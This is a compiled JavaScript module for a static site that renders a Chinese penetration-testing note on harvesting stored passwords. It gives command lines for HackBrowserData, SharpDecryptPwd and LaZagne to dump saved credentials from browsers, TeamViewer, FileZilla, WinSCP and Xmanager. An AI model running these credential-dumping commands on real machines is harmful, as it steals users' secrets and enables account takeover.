import{_ as e,W as a,X as n,a1 as s}from"./framework-b6a07282.js";const i={},l=s(`<h2 id="浏览器、数据库等其他密码的抓取" tabindex="-1"><a class="header-anchor" href="#浏览器、数据库等其他密码的抓取" aria-hidden="true">#</a> 浏览器、数据库等其他密码的抓取</h2><h3 id="hackbrowserdata" tabindex="-1"><a class="header-anchor" href="#hackbrowserdata" aria-hidden="true">#</a> HackBrowserData</h3><ul><li>抓取浏览器密码，谷歌、火狐、IE、Vivaldi等常见的浏览器都能抓</li></ul><p>直接命令行执行HackBrowserData.exe</p><p>BrowserGhost也是抓浏览器，也是命令执行exe程序</p><h3 id="sharpdecryptpwd" tabindex="-1"><a class="header-anchor" href="#sharpdecryptpwd" aria-hidden="true">#</a> SharpDecryptPwd</h3><ul><li>可抓取：</li></ul><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>SharpDecryptPwd.exe ‐TeamViewer
SharpDecryptPwd.exe ‐FileZilla
SharpDecryptPwd.exe ‐WinSCP
SharpDecryptPwd.exe ‐Xmangager ‐p Session_Path
SharpDecryptPwd.exe ‐Browser
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="lazagne" tabindex="-1"><a class="header-anchor" href="#lazagne" aria-hidden="true">#</a> LaZagne</h3><ul><li>是用于开源应⽤程序获取⼤量的密码存储在本地计算机上。每个软件都使⽤不同的技术（明⽂、API、⾃定义算 法、数据库等）存储其密码。开发此⼯具的⽬的是为最常⽤的软件查找这些密码。</li></ul><div class="language-bash line-numbers-mode" data-ext="sh"><pre class="language-bash"><code>laZagne.exe all <span class="token comment">#直接一把梭</span>
laZagne.exe browsers
laZagne.exe browsers ‐firefox
laZagne.exe all ‐oN
laZagne.exe all ‐oA ‐output C:<span class="token punctuation">\\</span>Users<span class="token punctuation">\\</span>test<span class="token punctuation">\\</span>Desktop
laZagne.exe ‐h
laZagne.exe browsers ‐h
laZagne.exe all ‐vv
laZagne.exe all ‐quiet ‐oA
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,11),r=[l];function d(t,c){return a(),n("div",null,r)}const h=e(i,[["render",d],["__file","浏览器、数据库等其他密码的抓取.html.vue"]]);export{h as default};
